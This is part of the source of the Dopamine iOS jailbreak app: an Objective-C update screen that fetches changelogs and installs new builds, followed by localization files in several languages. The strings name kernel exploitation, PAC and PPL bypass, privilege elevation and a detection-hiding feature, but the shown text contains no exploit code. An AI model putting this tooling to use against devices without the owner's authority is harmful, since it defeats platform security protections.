        [self.changelogSuperview.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [self.changelogSuperview.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor],
        [self.changelog.topAnchor constraintEqualToAnchor:self.changelogSuperview.topAnchor],
        [self.changelog.leadingAnchor constraintEqualToAnchor:self.changelogSuperview.leadingAnchor],
        [self.changelog.trailingAnchor constraintEqualToAnchor:self.changelogSuperview.trailingAnchor],
        [self.changelog.bottomAnchor constraintEqualToAnchor:self.changelogSuperview.bottomAnchor]
    ]];


    //add a alpha gradient mask to changelog superview
    self.gradientMask = [CAGradientLayer layer];
    self.gradientMask.frame = self.changelogSuperview.bounds;
    self.gradientMask.colors = @[(id)[UIColor clearColor].CGColor, (id)[UIColor whiteColor].CGColor, (id)[UIColor whiteColor].CGColor, (id)[UIColor clearColor].CGColor];
    self.gradientMask.locations = @[@0.0, @0.01, @0.5, @0.87];
    self.changelogSuperview.layer.mask = self.gradientMask;

    BOOL envUpdate = [[DOUIManager sharedInstance] environmentUpdateAvailable];
    
    self.button = [DOActionMenuButton buttonWithAction:[UIAction actionWithTitle:DOLocalizedString(envUpdate ? @"Button_Update_Environment" : @"Button_Update") image:[UIImage systemImageNamed:@"arrow.down" withConfiguration:[DOGlobalAppearance smallIconImageConfiguration]] identifier:@"update" handler:^(__kindof UIAction * _Nonnull action) {
        if (envUpdate)
        {
            self.button.enabled = NO;
            self.button.alpha = 0.5;
            NSError *error = [[DOEnvironmentManager sharedManager] updateEnvironment];
            if (error)
            {
                UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Error Updating Basebin" message:error.localizedDescription preferredStyle:UIAlertControllerStyleAlert];
                [alert addAction:[UIAlertAction actionWithTitle:DOLocalizedString(@"Button_Close") style:UIAlertActionStyleDefault handler:nil]];
                [self presentViewController:alert animated:YES completion:nil];
            }
            return;
        }

        if (![DOEnvironmentManager sharedManager].isJailbroken || [[DOUIManager sharedInstance] launchedReleaseNeedsManualUpdate] || ![DOEnvironmentManager sharedManager].isInstalledThroughTrollStore)
        {
            if ([DOEnvironmentManager sharedManager].isInstalledThroughTrollStore) {
                LSApplicationProxy *tsAppProxy = [LSApplicationProxy applicationProxyForIdentifier:@"com.opa334.TrollStore"];
                if ([tsAppProxy.claimedURLSchemes containsObject:@"apple-magnifier"]) {
                    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:[@"apple-magnifier://install?url=" stringByAppendingString:self.lastestDownloadUrl]] options:@{} completionHandler:nil];
                    return;
                }
            }
            [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"https://github.com/opa334/Dopamine/releases"] options:@{} completionHandler:nil];
            return;
        }

        DODownloadViewController *downloadVC = [[DODownloadViewController alloc] initWithUrl:self.lastestDownloadUrl callback:^(NSURL * _Nonnull file) {
            NSLog(@"Downloaded %@", file);
            [[DOEnvironmentManager sharedManager] updateJailbreakFromTIPA:file.path];
        }];
        [(UINavigationController*)(self.parentViewController) pushViewController:downloadVC animated:YES];
    }] chevron:NO];
    
    self.button.translatesAutoresizingMaskIntoConstraints = NO;
    self.button.hidden = !envUpdate;
    [self.view addSubview:self.button];

    [NSLayoutConstraint activateConstraints:@[
        [self.button.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.button.heightAnchor constraintEqualToConstant:30],
        [self.button.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor constant:-20]
    ]];


    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self updateChangelog];
    });
}

- (void)viewDidLayoutSubviews {
    [super viewDidLayoutSubviews];
    self.gradientMask.frame = self.changelogSuperview.bounds;
}

#pragma mark - Fetching Changelog

- (void)updateChangelog
{
    NSArray *releases = [[DOUIManager sharedInstance] getUpdatesInRange:self.fromTag end:self.toTag];
    NSMutableParagraphStyle * paragraphStyle = [[NSMutableParagraphStyle alloc] init];
    paragraphStyle.alignment = NSTextAlignmentCenter;
    NSMutableAttributedString *changelogText = [[NSMutableAttributedString alloc] initWithString:@""];

    if (releases.count == 0)
    {
        [changelogText appendAttributedString:[[NSAttributedString alloc] initWithString:DOLocalizedString(@"Changelog_Unavailable_Text") attributes:@{NSFontAttributeName: [UIFont systemFontOfSize:18], NSForegroundColorAttributeName : [UIColor whiteColor], NSParagraphStyleAttributeName:paragraphStyle}]];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.changelog.attributedText = changelogText;
        });
        return;
    }

    [releases enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        NSDictionary *release = (NSDictionary*)obj;
        NSString *name = release[@"name"];
        NSString *body = release[@"body"];
        [changelogText appendAttributedString:[[NSAttributedString alloc] initWithString:[NSString stringWithFormat:@"%@\n", name] attributes:@{NSFontAttributeName: [UIFont boldSystemFontOfSize:18], NSForegroundColorAttributeName : [UIColor whiteColor], NSParagraphStyleAttributeName:paragraphStyle}]];
        [changelogText appendAttributedString:[[NSAttributedString alloc] initWithString:@"\n"]];
        
        NSAttributedStringMarkdownParsingOptions *parsingOptions = [[NSAttributedStringMarkdownParsingOptions alloc] init];
        parsingOptions.allowsExtendedAttributes = YES;
        parsingOptions.interpretedSyntax = NSAttributedStringMarkdownInterpretedSyntaxInlineOnlyPreservingWhitespace;

        NSMutableAttributedString *markdownStringMut = [[NSAttributedString alloc] initWithMarkdownString:body options:parsingOptions baseURL:nil error:nil].mutableCopy;
        
        [markdownStringMut addAttributes:@{NSFontAttributeName: [UIFont systemFontOfSize:16], NSForegroundColorAttributeName : [UIColor whiteColor], NSParagraphStyleAttributeName:paragraphStyle} range:NSMakeRange(0, markdownStringMut.length)];

        [changelogText appendAttributedString:markdownStringMut];
        
        [changelogText appendAttributedString:[[NSAttributedString alloc] initWithString:@"\n\n\n"]];
        if (idx == 0)
        {
            NSArray *assets = release[@"assets"];
            if (assets && assets.count > 0)
            {
                dispatch_async(dispatch_get_main_queue(), ^{
                    self.lastestDownloadUrl = release[@"assets"][0][@"browser_download_url"];
                    self.button.hidden = NO;
                });
            }
        }
    }];
    [changelogText appendAttributedString:[[NSAttributedString alloc] initWithString:@"\n\n\n\n\n\n\n\n\n\n"]];
    dispatch_async(dispatch_get_main_queue(), ^{
        self.changelog.attributedText = changelogText;
    });
}

#pragma mark - Status Bar

- (UIStatusBarStyle)preferredStatusBarStyle
{
    return UIStatusBarStyleLightContent;
}


@end

```

`Application/Dopamine/ar.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "صنع بواسطة opa334 و évelyne";

// Log
"Status_Title_Jailbreaking" = "جارِ تفعيل الجيلبريك";
"Log_Error" = "فشل";

// Jailbreak Button
"Button_Jailbreak_Title" = "جيلبريك";
"Status_Title_Jailbroken" = "الجيلبريك مفعل";
"Unsupported" = "غير مدعوم";

// Action Menu
"Menu_Settings_Title" = "الإعدادات";
"Menu_Restart_SpringBoard_Title" = "إعادة تشغيل واجهة النظام";
"Menu_Reboot_Userspace_Title" = "إعادة تشغيل Userspace";
"Menu_Credits_Title" = "الاعتمادات";

// Updating
"Button_Update" = "تحديث";
"Button_Update_Available" = "يتوفر تحديث";
"Button_Update_Environment" = "تحديث البيئة";

// Update View
"Update_Status_Downloading" = "جارِ تنزيل التحديث…";
"Update_Status_Subtitle_Please_Wait" = "يرجى الانتظار لحين الانتهاء من تنزيل الملفات";
"Update_Status_Installing" = "جارِ تثبيت التحديث…";
"Update_Status_Subtitle_Restart_Soon" = "سيتم إعادة تشغيل الجهاز خلال لحظات";
"Title_Changelog" = "سجل التغييرات";
"Changelog_Unavailable_Text" = "سجل التغييرات غير متاح";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "إزالة الجيلبريك";
"Removed_Jailbreak_Alert_Message" = "تم إزالة الجيلبريك بنجاح. يوصى بإعادة تشغيل الجهاز.";
"Button_Close" = "إغلاق";

// Error View
"Button_Share" = "مشاركة";
"Button_Reboot" = "إبلاغ";

// Settings Toggles
"Settings_Tweak_Injection" = "تشغيل الأدوات";
"Settings_iDownload" = "iDownload (محطة المطور)";
"Settings_Verbose_Logs" = "السجلات المطولة";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "إزالة الجيلبريك";
"Button_Hide_Jailbreak" = "إخفاء الجيلبريك";
"Button_Unhide_Jailbreak" = "عدم إخفاء الجيلبريك";
"Button_Refresh_Jailbreak_Apps" = "تحديث تطبيقات الجيلبريك";
"Button_Reinstall_Package_Managers" = "إعادة تثبيت مديري الحزم";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"إخفاء الجيلبريك\" يقوم بإزالة الملفات المتعلقة بالجيلبريك مؤقتًا حتى تفعيل الجيلبريك القادم.";
"Hint_Hide_Jailbreak_Jailbroken" = "\"إخفاء الجيلبريك\" يعطل الجيلبريك جزئيًا ويجعل كشفه أكثر صعوبة. ومع ذلك، فإن هذه الخاصية ليست فعالة ١٠٠٪؜ ولا تخفي كل شيء.";
"Section_Jailbreak_Settings" = "إعدادات الجيلبريك";
"Section_Actions" = "الإجراءات";
"Section_Customization" = "التخصيص";
"Section_Exploits" = "الثغرات";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "يتطلب إعادة تشغيل userspace";
"Alert_Tweak_Injection_Toggled_Body" = "إعادة تشغيل userspace ضرورية لتطبيق التغييرات. هل تريد فعلها الآن؟";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "إعادة التشغيل الآن";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "إعادة التشغيل لاحقًا";
"Alert_Remove_Jailbreak_Title" = "إزالة الجيلبريك";
"Alert_Remove_Jailbreak_Pressed_Body" = "ستؤدي إزالة الجيلبريك إلى حذف جميع الملفات المتعلقة به، ولكن سيتم الاحتفاظ بجميع التطبيقات والملفات والبيانات العادية. هل أنت متأكد من أنك تريد الاستمرار؟ لا يمكنك التراجع عن هذا الإجراء.";
"Alert_Remove_Jailbreak_Enabled_Body" = "إن تفعيل \"إزالة الجيلبريك\" سيؤدي إلى إزالة كل الملفات المتعلقة بالجيلبريك عند التفعيل القادم للجيلبريك، ولكن سيتم الاحتفاظ بكل التطبيقات العادية والملفات والبيانات. هل أنت متأكد من أنك تريد الاستمرار؟ لا يمكن التراجع عن هذا الإجراء.";
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "إلغاء";
"Button_Continue" = "استمرار";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "توجد عدة تطبيقات تحمل المعرف \"%@\" داخل دليل تطبيق Dopamine (\"%@\"). لا يمكن الاستمرار.";
"Duplicate_Apps_Error_User_App" = "التطبيقات التي تحمل المعرفات %@ موجودة داخل دليل تطبيق Dopamine (\"%@\") ولكنها مثبتة بشكل منفصل على النظام. لا يمكن الاستمرار.";
"Duplicate_Apps_Error_Icon_Cache" = "التطبيق الذي يحمل المعرف \"%@\" موجود داخل دليل تطبيق Dopamine (\"%@\") ولكنه مسجل في ذاكرة التخزين المؤقت للأيقونات تحت مسار مختلف (\"%@\"). لا يمكن الاستمرار.";

// Settings Lists
"Theme" = "السمة";
"Kernel Exploit" = "ثغرة الـ Kernel";
"PPL Bypass" = "تجاوز PPL";
"PAC Bypass" = "تجاوز PAC";
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "التراخيص";
"Credits_Button_Source_Code" = "شفرة المصدر";

// Logs
"Initializing Environment" = "تحسين بيئة الجيلبريك";
/*Initializing Protection*/
"Loading BaseBin TrustCache" = "تحميل BaseBin TrustCache";
"Applying Bind Mount" = "تطبيق Bind Mount";
"Removing Jailbreak" = "إزالة الجيلبريك";
"Elevating Privileges" = "رفع الامتيازات";
"Cleaning Up Exploits" = "تحسين أداء الثغرات";
"Building Phys R/W Primitive" = "بناء فيزيائية ق/ك المبدئية";
"Rebooting Userspace" = "إعادة تشغيل Userspace";
"Patchfinding" = "العثور على التصحيح";
"Exploiting Kernel (%@)" = "ثغرة الـ Kernel (%@)";
"Bypassing PAC (%@)" = "تجاوز PAC (%@)";
"Bypassing PPL (%@)" = "تجاوز PPL (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "اختر مدير الحزمة";
"Select_Package_Managers_Install_Message" = "إذا كنت محتارًا في الاختيار، فاختر Sileo";
"Continue" = "استمرار";


```

`Application/Dopamine/da.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Lavet af opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Jailbreaking";
"Log_Error" = "Mislykket";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Jailbroken";
/*Unsupported*/

// Action Menu
"Menu_Settings_Title" = "Indstillinger";
"Menu_Restart_SpringBoard_Title" = "Genstart SpringBoard";
"Menu_Reboot_Userspace_Title" = "Genstart Userspace";
"Menu_Credits_Title" = "Credits";

// Updating
"Button_Update" = "Opdater";
"Button_Update_Available" = "Opdatering tilgængelig";
"Button_Update_Environment" = "Update Environment";

// Update View
"Update_Status_Downloading" = "Downloader opdatering...";
"Update_Status_Subtitle_Please_Wait" = "Vent venligst mens filerne er færdige med at downloade";
"Update_Status_Installing" = "Installerer opdatering...";
"Update_Status_Subtitle_Restart_Soon" = "Enheden vil genstarte snart";
"Title_Changelog" = "Ændringslog";
"Changelog_Unavailable_Text" = "Ændringslog utilgængelig";

// Removed Jailbreak Alert
/*Removed_Jailbreak_Alert_Title*/
/*Removed_Jailbreak_Alert_Message*/
/*Button_Close*/

// Error View
/*Button_Share*/
/*Button_Reboot*/

// Settings Toggles
"Settings_Tweak_Injection" = "Tweak-injektion";
"Settings_iDownload" = "iDownload (Udviklerterminal)";
"Settings_Verbose_Logs" = "Detaljerede logfiler";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Fjern Jailbreak";
"Button_Hide_Jailbreak" = "Skjul Jailbreak";
"Button_Unhide_Jailbreak" = "Vis Jailbreak";
/*Button_Refresh_Jailbreak_Apps*/
"Button_Reinstall_Package_Managers" = "Reinstall Package Managers";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Skjul Jailbreak\" fjerner midlertidigt jailbreak-relaterede filer indtil næste jailbreak";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Hide Jailbreak\" partially disables the jailbreak and aims to make detection more challenging. However, it is not entirely effective and does not conceal everything.";
/*Section_Jailbreak_Settings*/
/*Section_Actions*/
/*Section_Customization*/
/*Section_Exploits*/

// Settings Alerts
/*Alert_Tweak_Injection_Toggled_Title*/
"Alert_Tweak_Injection_Toggled_Body" = "For at ændringerne træder i kraft, skal du genstarte Userspace. Vil du genstarte nu?";
/*Alert_Tweak_Injection_Toggled_Reboot_Now*/
/*Alert_Tweak_Injection_Toggled_Reboot_Later*/
"Alert_Remove_Jailbreak_Title" = "Fjern Jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "Fjernelse af jailbreak vil slette alle jailbreak-relaterede filer, men alle almindelige apps, filer og data vil blive bevaret. Er du sikker på, at du vil fortsætte? Du kan ikke fortryde denne handling.";
/*Alert_Remove_Jailbreak_Enabled_Body*/
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "Annuller";
/*Button_Continue*/

// Duplicate Apps Errors
/*Duplicate_Apps_Error_Dopamine_App*/
/*Duplicate_Apps_Error_User_App*/
/*Duplicate_Apps_Error_Icon_Cache*/

// Settings Lists
/*Theme*/
/*Kernel Exploit*/
/*PPL Bypass*/
/*PAC Bypass*/
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Licens";
"Credits_Button_Source_Code" = "Kildekode";

// Logs
"Initializing Environment" = "Initialiserer miljø";
/*Initializing Protection*/
/*Loading BaseBin TrustCache*/
/*Applying Bind Mount*/
/*Removing Jailbreak*/
/*Elevating Privileges*/
/*Cleaning Up Exploits*/
/*Building Phys R/W Primitive*/
/*Rebooting Userspace*/
"Patchfinding" = "Patchfinding";
/*Exploiting Kernel (%@)*/
/*Bypassing PAC (%@)*/
/*Bypassing PPL (%@)*/

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Vælg Pakkehåndteringsprogram(mer)";
"Select_Package_Managers_Install_Message" = "If you are unsure which one to select, select Sileo";
"Continue" = "Continue";


```

`Application/Dopamine/de.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Von opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Jailbreaken";
"Log_Error" = "Erfolglos";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Gejailbreakt";
"Unsupported" = "Nicht unterstützt";

// Action Menu
"Menu_Settings_Title" = "Einstellungen";
"Menu_Restart_SpringBoard_Title" = "SpringBoard neustarten";
"Menu_Reboot_Userspace_Title" = "Userspace-Neustart";
"Menu_Credits_Title" = "Über";

// Updating
"Button_Update" = "Aktualisieren";
"Button_Update_Available" = "Aktualisierung verfügbar";
"Button_Update_Environment" = "Umgebung aktualisieren";

// Update View
"Update_Status_Downloading" = "Lade Aktualisierung herunter...";
"Update_Status_Subtitle_Please_Wait" = "Bitte warte, bis die Dateien heruntergeladen wurden";
"Update_Status_Installing" = "Installiere Aktualisierung...";
"Update_Status_Subtitle_Restart_Soon" = "Das Gerät wird bald neustarten";
"Title_Changelog" = "Changelog";
"Changelog_Unavailable_Text" = "Changelog nicht verfügbar";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "Jailbreak entfernt";
"Removed_Jailbreak_Alert_Message" = "Der Jailbreak wurde erfolgreich entfernt. Eine Geräte-Neustart wird empfohlen.";
"Button_Close" = "Schließen";

// Error View
"Button_Share" = "Teilen";
"Button_Reboot" = "Neustarten";

// Settings Toggles
"Settings_Tweak_Injection" = "Tweaks laden";
"Settings_iDownload" = "iDownload (Entwickler-Terminal)";
"Settings_Verbose_Logs" = "Detaillierte Logs";
"Settings_Apps_JIT" = "Erlaube JIT in Apps";
"Settings_Allow_Old_arm64e_ABI_Libraries" = "Erlaube veraltete arm64e ABI";
"Settings_Jetsam_Multiplier" = "Jetsam Multiplikator";

// Settings Buttons
"Button_Remove_Jailbreak" = "Jailbreak entfernen";
"Button_Hide_Jailbreak" = "Jailbreak verstecken";
"Button_Unhide_Jailbreak" = "Jailbreak wieder anzeigen";
"Button_Refresh_Jailbreak_Apps" = "Jailbreak Apps erneuern";
"Button_Reinstall_Package_Managers" = "Packet-Manager neuinstallieren";
"Button_Change_Mobile_Password" = "\"mobile\" Passwort ändern";

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Jailbreak verstecken\" entfernt die Jailbreak Dateien temporär bis zum nächsten Jailbreak";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Jailbreak verstecken\" deaktiviert den Jailbreak teilweise und versucht das Erkennen des Jailbreaks zu erschweren. Es ist allerdings nicht 100% effektiv und verbirgt aktuell nicht alles.";
"Section_Jailbreak_Settings" = "Jailbreak Einstellungen";
"Section_Actions" = "Aktionen";
"Section_Customization" = "Design";
"Section_Exploits" = "Exploits";
"Section_Boot_Logo" = "Boot-Logo";
"Jetsam_Description" = "Jetsam ist ein System-Feature, welches Prozesse, die vorgegebene Speicherlimit überschreiten, automatisch beendet. Wenn viele Tweaks installiert wurden, kann es passieren, dass Prozesse direkt nach dem Start beendet werden, was diese in eine Absturzschleife versetzen kann. Hier kann ein Multiplikator gewählt werden, mit welchem jedes Speicherlimit, das vom System gesetzt wird, multipliziert wird. Erhöhe diese Einstellung, falls unterwünschtes Systemverhalten bei einer hohen Anzahl von installierten Tweaks auftritt. Um den Speicherverbrauch des Systems nicht negativ zu beeinflussen, wird empfohlen die kleinstmögliche Einstellung zu wählen, unter welcher das System stabil läuft.";
"Enabled" = "Aktiviert";
"Custom_Boot_Logo" = "Benutzerdefiniertes Boot-Logo";
"Select_Image" = "Bild auswählen";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "Userspace-Neustart erforderlich";
"Alert_Tweak_Injection_Toggled_Body" = "Um die Änderungen anzuwenden ist ein Userspace-Neustart erforderlich, soll dieser jetzt durchgeführt werden?";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "Jetzt neustarten";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "Später neustarten";
"Alert_Remove_Jailbreak_Title" = "Jailbreak entfernen";
"Alert_Remove_Jailbreak_Pressed_Body" = "Das Entfernen des Jailbreaks wird alle mit dem Jailbreak zusammenhängenden Dateien löschen, alle regulären Apps, Dateien und Daten bleiben erhalten. Diese Aktion kann nicht rückgangig gemacht werden, bist du sicher?";
"Alert_Remove_Jailbreak_Enabled_Body" = "Das Aktivieren von \"Jailbreak entfernen\" wird beim nächsten Jailbreak alle mit dem Jailbreak zusammenhängenden Dateien löschen, alle regulären Apps, Dateien und Daten bleiben erhalten. Diese Aktion kann nicht rückgangig gemacht werden, bist du sicher?";
"Alert_Change_Mobile_Password_Body" = "Setzte das Passwort des \"mobile\" Benutzers von deinem Gerät, dieses Passwort kann ebenfalls für Root-Zugriff via sudo verwendet werden. Um das Root-Passwort zu setzen kann der Befehl \"sudo passwd root\" innerhalb einer mobile-Shell verwendet werden.";
"Password_Placeholder" = "Passwort";
"Repeat_Password_Placeholder" = "Passwort wiederholen";
/*Password_Auth_Required*/
"Button_Change" = "Ändern";
"Button_Cancel" = "Abbrechen";
"Button_Continue" = "Weiter";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "Es existieren mehrere Apps mit unter der Kennung \"%@\" in Dopamines App-Ordner (\"%@\"). Fortfahren des Jailbreaks nicht möglich.";
"Duplicate_Apps_Error_User_App" = "Die Apps mit der Kennung %@ existieren in Dopamines App-Ordner (\"%@\"), sind aber separat ebenfalls auf dem System installiert. Fortfahren des Jailbreaks nicht möglich.";
"Duplicate_Apps_Error_Icon_Cache" = "Die App mit der Kennung \"%@\" existiert in Dopamines App-Ordner (\"%@\") aber ist ebenfalls im Icon-Cache unter einem anderen Pfad (\"%@\") registriert. Fortfahren des Jailbreaks nicht möglich.";

// Settings Lists
"Theme" = "Farbschema";
"Kernel Exploit" = "Kernel Exploit";
"PPL Bypass" = "PPL Bypass";
"PAC Bypass" = "PAC Bypass";
"None" = "Keiner";
"Recommended" = "Empfohlen";

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Lizenz";
"Credits_Button_Source_Code" = "Quellcode";

// Logs
"Initializing Environment" = "Initialisiere Umgebung";
"Initializing Protection" = "Initialisiere Schutz";
"Loading BaseBin TrustCache" = "Lade BaseBin TrustCache";
"Applying Bind Mount" = "Wende Bind Mount an";
"Removing Jailbreak" = "Entferne Jailbreak";
"Elevating Privileges" = "Erhöhe Berechtigungen";
"Cleaning Up Exploits" = "Räume Exploits auf";
"Building Phys R/W Primitive" = "Baue Phys R/W Primitive";
"Rebooting Userspace" = "Reboote Userspace";
"Patchfinding" = "Finde Patches";
"Exploiting Kernel (%@)" = "Exploite Kernel (%@)";
"Bypassing PAC (%@)" = "Umgehe PAC (%@)";
"Bypassing PPL (%@)" = "Umgehe PPL (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Paket Manager auswählen";
"Select_Package_Managers_Install_Message" = "Bei Unklarheiten, wähle Sileo aus";
"Continue" = "Fortsetzen";


```

`Application/Dopamine/el.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Δημιουργήθηκε από opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Jailbreaking";
"Log_Error" = "Αποτυχία";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Jailbroken";
/*Unsupported*/

// Action Menu
"Menu_Settings_Title" = "Ρυθμίσεις";
"Menu_Restart_SpringBoard_Title" = "Επανεκκίνηση SpringBoard";
"Menu_Reboot_Userspace_Title" = "Επανεκκίνηση Userspace";
"Menu_Credits_Title" = "Ειδική μνεία";

// Updating
"Button_Update" = "Ενημέρωση";
"Button_Update_Available" = "Διαθέσιμη ενημέρωση";
"Button_Update_Environment" = "Ενημέρωση Περιβάλλοντος";

// Update View
"Update_Status_Downloading" = "Λήψη αναβάθμισης...";
"Update_Status_Subtitle_Please_Wait" = "Παρακαλώ αναμείνατε την ολοκλήρωση λήψης των αρχείων";
"Update_Status_Installing" = "Εγκατάσταση αναβάθμισης...";
"Update_Status_Subtitle_Restart_Soon" = "Η συσκευή θα επανεκκινήσει σύντομα";
"Title_Changelog" = "Αρχείο αλλαγών";
"Changelog_Unavailable_Text" = "Αρχείο αλλαγών μη διαθέσιμο";

// Removed Jailbreak Alert
/*Removed_Jailbreak_Alert_Title*/
/*Removed_Jailbreak_Alert_Message*/
/*Button_Close*/

// Error View
/*Button_Share*/
/*Button_Reboot*/

// Settings Toggles
"Settings_Tweak_Injection" = "Ενσωμάτωση Tweak";
"Settings_iDownload" = "iDownload (Τερματικό προγραμματιστή)";
"Settings_Verbose_Logs" = "Λεπτομερής καταγραφή";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Αφαίρεση Jailbreak";
"Button_Hide_Jailbreak" = "Απόκρυψη Jailbreak";
"Button_Unhide_Jailbreak" = "Επανεμφάνιση Jailbreak";
/*Button_Refresh_Jailbreak_Apps*/
"Button_Reinstall_Package_Managers" = "Επανεγκατάσταση εφαρμοφών διαχείρισης πακέτων";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Απόκρυψη Jailbreak\" Αφαιρεί προσωρινά τα αρχεία που σχετίζονται με το jailbreak μέχρι το απόμενο jailbreak";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Απόκρυψη Jailbreak\" απενεργοποιεί μερικώς το jailbreak στοχεύοντας να κάνει την ανίχνευση του δυσκολότερη. Ωστόσο, δεν είναι απολύτως αποτελεσματικό και δεν το αποκρύπτει ολικώς.";
/*Section_Jailbreak_Settings*/
/*Section_Actions*/
/*Section_Customization*/
/*Section_Exploits*/

// Settings Alerts
/*Alert_Tweak_Injection_Toggled_Title*/
"Alert_Tweak_Injection_Toggled_Body" = "Για να εφαρμοστούν οι αλλαγές, πρέπει να γίνει επανεκκίνηση Userspace. Θέλεις να γίνει επανεκκίνηση τώρα;";
/*Alert_Tweak_Injection_Toggled_Reboot_Now*/
/*Alert_Tweak_Injection_Toggled_Reboot_Later*/
"Alert_Remove_Jailbreak_Title" = "Αφαίρεση Jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "Η αφαίρεση του jailbreak θα διαγράψει όλα τα αρχεία που σχετίζονται με το jailbreak, αλλά όλες οι συνήθεις εφαρμογές, αρχεία και δεδομένα θα διατηρηθούν. Είστε σίγουροι πως θέλετε να συνεχίσετε; Δεν μπορείτε να αντιστρέψετε αυτή την ενέργεια.";
/*Alert_Remove_Jailbreak_Enabled_Body*/
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "Ακύρωση";
"Button_Continue" = "Continue";

// Duplicate Apps Errors
/*Duplicate_Apps_Error_Dopamine_App*/
/*Duplicate_Apps_Error_User_App*/
/*Duplicate_Apps_Error_Icon_Cache*/

// Settings Lists
/*Theme*/
/*Kernel Exploit*/
/*PPL Bypass*/
/*PAC Bypass*/
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Άδεια χρήσης";
"Credits_Button_Source_Code" = "Πηγαίος κώδικας";

// Logs
"Initializing Environment" = "Αρχικοποίηση Περιβάλλοντος";
/*Initializing Protection*/
/*Loading BaseBin TrustCache*/
/*Applying Bind Mount*/
/*Removing Jailbreak*/
/*Elevating Privileges*/
/*Cleaning Up Exploits*/
/*Building Phys R/W Primitive*/
/*Rebooting Userspace*/
"Patchfinding" = "Patchfinding";
/*Exploiting Kernel (%@)*/
/*Bypassing PAC (%@)*/
/*Bypassing PPL (%@)*/

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Επιλογή εφαρμογής/ών διαχείρισης πακέτων";
"Select_Package_Managers_Install_Message" = "Αν δεν είστε σίγουροι, επιλέξτε το Sileo";
"Continue" = "Συνέχεια";


```

`Application/Dopamine/en.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "by opa334, ElleKit by évelyne";

// Log
"Status_Title_Jailbreaking" = "Jailbreaking";
"Log_Error" = "Error";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Jailbroken";
"Unsupported" = "Unsupported";

// Action Menu
"Menu_Settings_Title" = "Settings";
"Menu_Restart_SpringBoard_Title" = "Restart SpringBoard";
"Menu_Reboot_Userspace_Title" = "Reboot Userspace";
"Menu_Credits_Title" = "Credits";

// Updating
"Button_Update" = "Update";
"Button_Update_Available" = "Update Available";
"Button_Update_Environment" = "Update Environment";

// Update View
"Update_Status_Downloading" = "Downloading update...";
"Update_Status_Subtitle_Please_Wait" = "Please wait while files finish downloading";
"Update_Status_Installing" = "Installing update...";
"Update_Status_Subtitle_Restart_Soon" = "The device will restart soon";
"Title_Changelog" = "Changelog";
"Changelog_Unavailable_Text" = "Changelog Unavailable";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "Removed Jailbreak";
